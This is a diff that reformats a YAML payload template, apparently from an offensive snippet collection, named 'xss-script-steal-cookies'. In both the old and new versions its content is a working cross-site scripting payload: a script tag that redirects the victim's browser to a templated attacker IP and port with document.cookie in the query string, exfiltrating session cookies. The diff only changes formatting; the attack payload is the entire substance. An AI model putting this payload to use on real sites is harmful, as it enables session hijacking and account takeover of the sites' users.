@@ -1,11 +1,9 @@
+---
 metadata:
-  filename: xss-script-steal-cookies.yaml
-  tags:
-  - web
-  - xss
-  created: '2025-03-29'
-  author: '@anakles'
-content: '<script type="text/javascript">document.location="http://{{ attacker_ip
-  }}:{{ delivery_outbound_port }}/?c="+document.cookie;</script>
+  filename: "xss-script-steal-cookies.yaml"
+  tags: ["web", "xss"]
+  created: "2025-03-29"
+  author: "@anakles"
 
-  '
+content: |
+  <script type="text/javascript">document.location="http://{{ attacker_ip }}:{{ delivery_outbound_port }}/?c="+document.cookie;</script>
